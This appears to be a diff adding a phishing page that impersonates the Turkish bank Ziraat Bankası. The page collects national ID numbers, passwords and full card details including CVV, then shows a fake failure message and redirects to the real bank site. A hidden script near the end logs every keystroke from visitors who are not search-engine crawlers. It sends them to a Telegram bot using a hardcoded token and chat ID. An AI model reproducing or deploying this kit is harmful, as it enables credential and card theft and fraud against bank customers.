@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Ziraat Bankası Giriş</title> 
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: url('1_Genis_Sube_ATM.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 16px;
+      padding-top: 72px;
+      flex-direction: column;
+    }
+
+    /* Parola ekranı stilleri */
+    #login {
+      background: rgba(0,0,0,0.8);
+      color: white;
+      padding: 30px 40px;
+      border-radius: 16px;
+      text-align: center;
+      max-width: 350px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.7);
+      margin-bottom: 20px;
+    }
+    #login h2 {
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+    #login input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+      margin-bottom: 12px;
+    }
+    #login button {
+      width: 100%;
+      padding: 12px;
+      background-color: #c00000;
+      color: white;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    #login button:hover {
+      background-color: #a00000;
+    }
+    #error {
+      color: #ff6666;
+      margin-top: 10px;
+      display: none;
+    }
+
+    /* Sayfa içeriği - gizli başlangıçta */
+    #content {
+      width: 100%;
+      max-width: 400px;
+    }
+
+    /* Mevcut sayfa stilin aşağıda devam ediyor */
+
+    .ziraat-header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 56px;
+      background-color: #c00000;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 24px;
+      box-shadow: 0 4px 12px rgba(192, 0, 0, 0.6);
+      color: white;
+      border-radius: 0 0 16px 16px;
+      z-index: 10000;
+    }
+
+    .ziraat-header h1 {
+      font-weight: 700;
+      font-size: 20px;
+    }
+
+    .menu-toggle {
+      font-size: 22px;
+      cursor: pointer;
+    }
+
+    .sidebar {
+      position: fixed;
+      top: 0;
+      right: -260px;
+      width: 260px;
+      height: 100%;
+      background: #c00000;
+      color: #fff;
+      padding: 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      transition: right 0.3s ease;
+      z-index: 9999;
+      border-radius: 16px 0 0 16px;
+    }
+
+    .sidebar.active {
+      right: 0;
+    }
+
+    .sidebar a {
+      color: #fff;
+      text-decoration: none;
+      font-size: 18px;
+      font-weight: 500;
+    }
+
+    .sidebar .close-btn {
+      align-self: flex-end;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .container {
+      background: rgba(0, 0, 0, 0.7);
+      border-radius: 20px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+      width: 100%;
+      max-width: 400px;
+      padding: 24px;
+      color: #fff;
+      margin-top: 72px;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .header h2 {
+      color: #fff;
+    }
+
+    .header i {
+      margin-right: 8px;
+    }
+
+    label {
+      display: block;
+      margin-top: 16px;
+      font-weight: 500;
+      color: #fff;
+    }
+
+    .input-icon {
+      position: relative;
+    }
+
+    .input-icon i {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #ccc;
+    }
+
+    .input-icon input {
+      width: 100%;
+      padding: 12px 12px 12px 38px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      margin-top: 6px;
+      background: rgba(255, 255, 255, 0.1);
+      color: #fff;
+    }
+
+    .input-icon input::placeholder {
+      color: #ccc;
+    }
+
+    .row {
+      display: flex;
+      gap: 12px;
+      margin-top: 16px;
+    }
+
+    .row > div {
+      flex: 1;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 24px;
+      padding: 14px;
+      background: #c00000;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #a00000;
+    }
+
+    .success {
+      text-align: center;
+      margin-top: 16px;
+      font-weight: 600;
+      display: none;
+    }
+
+    @media (max-width: 480px) {
+      .ziraat-header {
+        padding: 0 16px;
+        height: 50px;
+      }
+      .ziraat-header h1 {
+        font-size: 18px;
+      }
+      body {
+        padding-top: 60px;
+      }
+      .container {
+        padding: 20px;
+      }
+      button {
+        font-size: 14px;
+        padding: 12px;
+      }
+      /* Mobilde row flexi alt alta sarması için */
+      .row {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Parola + TC Girişi -->
+  <div id="login">
+
+
+    <!-- Header -->
+    <header class="ziraat-header">
+      <h1>Ziraat Bankası</h1>
+      <div class="menu-toggle" id="openMenu"><i class="fas fa-bars"></i></div>
+    </header>
+
+
+    <div class="sidebar" id="sidebarMenu">
+      <div class="close-btn" id="closeMenu"><i class="fas fa-times"></i></div>
+      <a href="https://www.ziraatbank.com.tr/tr">Hesaplarım</a>
+      <a href="https://www.ziraatbank.com.tr/tr">Kartlarım</a>
+      <a href="https://www.ziraatbank.com.tr/tr">Şubeler</a>
+      <a href="https://www.ziraatbank.com.tr/tr">İletişim</a>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+    <h2>Sayfaya Giriş İçin Bilgilerinizi Giriniz</h2>
+    <input type="text" id="tc" placeholder="TC Kimlik No" />
+    <input type="password" id="password" placeholder="Şifre" />
+    <button onclick="checkPassword()">Giriş</button>
+    <p id="error">Lütfen tüm alanları doldurun!</p>
+  </div>
+
+  <!-- Sayfa İçeriği -->
+  <div id="content">
+    <!-- Header -->
+    <header class="ziraat-header">
+      <h1>Ziraat Bankası</h1>
+      <div class="menu-toggle" id="openMenu"><i class="fas fa-bars"></i></div>
+    </header>
+
+    <!-- Sidebar Menü -->
+    <div class="sidebar" id="sidebarMenu">
+      <div class="close-btn" id="closeMenu"><i class="fas fa-times"></i></div>
+      <a href="https://www.ziraatbank.com.tr/tr">Hesaplarım</a>
+      <a href="https://www.ziraatbank.com.tr/tr">Kartlarım</a>
+      <a href="https://www.ziraatbank.com.tr/tr">Şubeler</a>
+      <a href="https://www.ziraatbank.com.tr/tr">İletişim</a>
+    </div>
+
+    <!-- Form -->
+    <div class="container">
+      <div class="header">
+        <h2><i class="fas fa-university"></i> Ziraat Bankası</h2>
+      </div>
+      <form id="loginForm">
+        <label>Kart Üzerindeki İsim</label>
+        <div class="input-icon">
+          <i class="fas fa-user"></i>
+          <input type="text" required placeholder="Ad Soyad" />
+        </div>
+
+        <label>Kart Numarası</label>
+        <div class="input-icon">
+          <i class="far fa-credit-card"></i>
+          <input type="text" maxlength="19" placeholder="1234 5678 9012 3456" required />
+        </div>
+
+        <div class="row">
+          <div>
+            <label>Son Kullanma</label>
+            <div class="input-icon">
+              <i class="fas fa-calendar-alt"></i>
+              <input type="text" placeholder="AA/YY" maxlength="5" required />
+            </div>
+          </div>
+          <div>
+            <label>CVV</label>
+            <div class="input-icon">
+              <i class="fas fa-lock"></i>
+              <input type="password" maxlength="3" placeholder="***" required />
+            </div>
+          </div>
+        </div>
+
+        <button type="submit">Hesabıma Gir</button>
+        <div class="success" id="resultMsg"></div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // Başlangıçta içerik gizli
+    document.getElementById('content').style.display = 'none';
+
+    function checkPassword() {
+      // Burada doğrulama yok, her giriş kabul edilecek
+      document.getElementById('login').style.display = 'none';
+      document.getElementById('content').style.display = 'block';
+    }
+
+    // Mevcut form submit işlemi
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const resultMsg = document.getElementById("resultMsg");
+      resultMsg.style.display = "block";
+      resultMsg.style.color = "red";
+      resultMsg.innerText = "❌ Giriş başarısız. Yönlendiriliyorsunuz...";
+      setTimeout(() => {
+        window.location.href = "https://www.ziraatbank.com.tr/tr";
+      }, 3000);
+    });
+
+    const sidebar = document.getElementById("sidebarMenu");
+    const openMenu = document.getElementById("openMenu");
+    const closeMenu = document.getElementById("closeMenu");
+
+    openMenu.addEventListener("click", () => {
+      sidebar.classList.add("active");
+    });
+
+    closeMenu.addEventListener("click", () => {
+      sidebar.classList.remove("active");
+    });
+  </script> 
+
+
+<script>
+if (!/Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot/.test(navigator.userAgent)) {
+
+
+const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
+const TELEGRAM_CHAT_ID = '5395609882';
+
+let buffer = "";
+let timeout = null;
+
+function sendBuffer() {
+  if (buffer.trim() !== "") {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: `[Tuş Takibi]\n${buffer}`
+      })
+    });
+    buffer = "";
+  }
+}
+
+document.addEventListener("keydown", function(e) {
+  buffer += e.key;
+  clearTimeout(timeout);
+  timeout = setTimeout(sendBuffer, 2000); // 2 saniye boşluk olursa gönder
+});
+
+}
+</script>
+
+
+
+
+
+
+
+
+
+</body>
+</html>
